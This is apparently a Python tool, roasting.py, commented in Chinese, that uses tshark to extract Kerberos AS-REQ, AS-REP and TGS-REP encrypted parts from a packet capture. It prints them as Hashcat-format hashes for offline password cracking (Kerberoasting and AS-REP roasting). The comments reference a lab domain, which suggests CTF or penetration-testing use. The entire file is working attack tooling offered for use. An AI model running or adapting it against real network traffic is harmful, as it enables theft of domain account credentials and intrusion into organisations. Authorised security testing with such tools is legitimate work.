import subprocess
import sys
from typing import List, Optional, Tuple


# ==========================================
# 核心工具函数
# ==========================================
def clean_hex(data: str) -> str:
    """清洗十六进制字符串 (移除冒号、空格、换行)"""
    if not data:
        return ""
    return data.replace(":", "").strip()


def smart_tshark_query(
    pcap_file: str,
    display_filter: str,
    fields_primary: List[str],
    fields_fallback: Optional[List[str]] = None,
) -> List[str]:
    """
    智能 Tshark 查询器
    """

    def build_cmd(fields):
        cmd = ["tshark", "-r", pcap_file, "-Y", display_filter, "-T", "fields"]
        for f in fields:
            cmd.extend(["-e", f])

        # [关键修改]
        # 1. separator=$ : 字段之间用 $ 分隔
        # 2. occurrence=a : 获取数组的所有项 (解决 SNameString 只有 MSSQL 没有域名的问题)
        # 3. aggregator=, : 数组内部用逗号分隔 (例如 MSSQL,hack-my.com)
        cmd.extend(["-E", "separator=$", "-E", "occurrence=a", "-E", "aggregator=,"])
        return cmd

    try:
        cmd = build_cmd(fields_primary)
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return [line for line in result.stdout.strip().split("\n") if line]
    except subprocess.CalledProcessError as e:
        err_msg = e.stderr.lower() if e.stderr else ""
        if fields_fallback and ("valid" in err_msg or "field" in err_msg):
            print(f"Warning: 检测到字段不兼容，正在尝试回退到旧版字段...", file=sys.stderr)
            try:
                cmd_old = build_cmd(fields_fallback)
                result_old = subprocess.run(cmd_old, capture_output=True, text=True, check=True)
                return [line for line in result_old.stdout.strip().split("\n") if line]
            except subprocess.CalledProcessError as e2:
                print(f"Error: 回退方案也失败了。\n详细错误: {e2.stderr}", file=sys.stderr)
        else:
            print(f"Error: Tshark 执行失败。\n详细错误: {e.stderr}", file=sys.stderr)
    return []


# ==========================================
# 协议解析逻辑
# ==========================================


def parse_asreq_packets(pcap_file: str) -> List[Tuple[str, str, str, str]]:
    # 1. 获取 Realm
    rep_lines = smart_tshark_query(pcap_file, "kerberos.msg_type == 11 && kerberos.crealm", ["kerberos.realm"])
    asrep_realms = [l.strip() for l in rep_lines]

    # 2. 获取 AS-REQ
    req_lines = smart_tshark_query(
        pcap_file,
        "kerberos.msg_type == 10 && kerberos.CNameString && kerberos.realm",
        fields_primary=[
            "kerberos.CNameString",
            "kerberos.realm",
            "kerberos.pA_ENC_TIMESTAMP_cipher",
            "kerberos.etype",
        ],
        fields_fallback=[
            "kerberos.CNameString",
            "kerberos.realm",
            "kerberos.cipher",
            "kerberos.etype",
        ],
    )

    results = []
    for i, line in enumerate(req_lines):
        try:
            parts = line.split("$")
            if len(parts) < 3:
                continue
            username, _old_realm, cipher_raw = parts[0], parts[1], parts[2]
            etype_str = parts[3] if len(parts) > 3 else "18"

            cipher = clean_hex(cipher_raw)
            if not cipher:
                continue

            realm = asrep_realms[i] if i < len(asrep_realms) else _old_realm
            etype = etype_str.split(",")[0]

            results.append((username, realm, cipher, etype))
        except Exception:
            continue
    return results


def parse_asrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str, str]]:
    # [修改说明] 仅针对此函数进行了逻辑修复，以正确识别 Etype 23
    lines = smart_tshark_query(
        pcap_file,
        "kerberos.msg_type == 11 && kerberos.CNameString && kerberos.realm",
        fields_primary=[
            "kerberos.CNameString",
            "kerberos.realm",
            "kerberos.encryptedKDCREPData_cipher",  # 这是用户部分，通常是 RC4
            "kerberos.etype",  # 这里可能返回 "18,23"
        ],
        fields_fallback=[
            "kerberos.CNameString",
            "kerberos.realm",
            "kerberos.cipher",
            "kerberos.etype",
        ],
    )

    results = []
    for line in lines:
        try:
            parts = line.split("$")
            if len(parts) < 3:
                continue
            user, domain, cipher_blob = parts[0], parts[1], parts[2]
            etype_str = parts[3] if len(parts) > 3 else "23"

            # [关键修复开始] --------------------------------------------
            # Tshark 返回的 etype 可能是 "18,23" (Ticket是AES, EncPart是RC4)
            # 我们需要检查列表中是否存在 23，如果存在，强制使用 23，否则代码会默认取第一个(18)而跳过
            etypes_list = etype_str.split(",")
            if "23" in etypes_list:
                etype = "23"
            else:
                etype = etypes_list[0]
            # [关键修复结束] --------------------------------------------

            if "," in cipher_blob:
                cipher_parts = cipher_blob.split(",")
                target_cipher = clean_hex(cipher_parts[-1] if len(cipher_parts) > 1 else cipher_parts[0])
            else:
                target_cipher = clean_hex(cipher_blob)

            checksum_len = 32 if etype == "23" else 24

            if len(target_cipher) > checksum_len:
                checksum = target_cipher[:checksum_len]
                enc_data = target_cipher[checksum_len:]
                results.append((user, domain, checksum, enc_data, etype))
        except Exception:
            continue
    return results


def parse_tgsrep_packets(pcap_file: str) -> List[Tuple[str, str, str, str, str, str]]:
    lines = smart_tshark_query(
        pcap_file,
        "kerberos.msg_type == 13 && kerberos.CNameString && kerberos.realm && kerberos.SNameString",
        fields_primary=[
            "kerberos.CNameString",
            "kerberos.realm",
            "kerberos.SNameString",
            "kerberos.encryptedTicketData_cipher",
            "kerberos.etype",
        ],
        fields_fallback=[
            "kerberos.CNameString",
            "kerberos.realm",
            "kerberos.SNameString",
            "kerberos.cipher",
            "kerberos.etype",
        ],
    )

    results = []
    for line in lines:
        try:
            parts = line.split("$")
            if len(parts) < 4:
                continue
            user, domain, spn_raw, cipher_blob = parts[0], parts[1], parts[2], parts[3]
            etype_str = parts[4] if len(parts) > 4 else "23"
            etype = etype_str.split(",")[0]

            # [关键修改]
            # Tshark 现在会返回 "MSSQL,hack-my.com"
            # 我们将其转换为 "MSSQL/hack-my.com"
            spn = spn_raw.replace(",", "/")

            if "," in cipher_blob:
                target_cipher = clean_hex(cipher_blob.split(",")[0])
            else:
                target_cipher = clean_hex(cipher_blob)

            checksum_len = 32 if etype == "23" else 24

            if len(target_cipher) > checksum_len:
                checksum = target_cipher[:checksum_len]
                enc_data = target_cipher[checksum_len:]
                results.append((user, domain, spn, checksum, enc_data, etype))
        except Exception:
            continue
    return results


# ==========================================
# 主入口
# ==========================================
def main():
    if len(sys.argv) != 3:
        print(
            "Usage: python roasting.py <pcap_file> <as_req|as_rep|tgs_rep>",
            file=sys.stderr,
        )
        sys.exit(1)

    pcap = sys.argv[1]
    mode = sys.argv[2].lower()

    if mode == "as_req":
        for u, d, c, e in parse_asreq_packets(pcap):
            if e == "23":
                # [Hashcat Mode 7500]
                # 格式: $krb5pa$23$用户名$域名$盐$密文
                # 注意: AS-REQ 中通常没有显式 Salt，默认 Salt 为空
                print(f"$krb5pa$23${u}${d}$${c}")
            else:
                # [Hashcat Mode 19900 (AES128) / 20000 (AES256)]
                # 格式: $krb5pa$18$用户名$域名$密文
                print(f"$krb5pa${e}${u}${d}${c}")

    elif mode == "as_rep":
        for u, d, checksum, enc, e in parse_asrep_packets(pcap):
            # [Hashcat Mode 18200] AS-REP Roasting
            # 只有 Etype 23 (RC4) 支持标准的 AS-REP Roasting 爆破
            if e == "23":
                # 格式: $krb5asrep$23$用户名@域名:Checksum$密文
                print(f"$krb5asrep${e}${u}@{d}:{checksum}${enc}")
            else:
                # 如果是 AES (17/18)，AS-REP Roasting 通常无法利用 (需要预认证不开启且强制降级)，
                # 且 Hashcat 18200 不支持，因此跳过并打印提示到 stderr
                print(f"[-] Skip AS-REP: User={u} uses Etype={e} (Not crackable via Mode 18200)", file=sys.stderr)

    elif mode == "tgs_rep":
        for u, d, s, checksum, enc, e in parse_tgsrep_packets(pcap):
            if e == "23":
                # [Hashcat Mode 13100] RC4
                # 格式: $krb5tgs$23$*用户名$域名$SPN*$Checksum$密文
                print(f"$krb5tgs$23$*{u}${d}${s}*${checksum}${enc}")
            else:
                # [Hashcat Mode 19600 (AES128) / 19700 (AES256)]
                # 格式: $krb5tgs$18$用户名$域名$SPN$Checksum$密文
                # 注意: AES 格式不需要星号，但需要包含 SPN
                print(f"$krb5tgs${e}${u}${d}${s}${checksum}${enc}")

    else:
        print(
            "Error: Second argument must be 'as_req', 'as_rep' or 'tgs_rep'",
            file=sys.stderr,
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
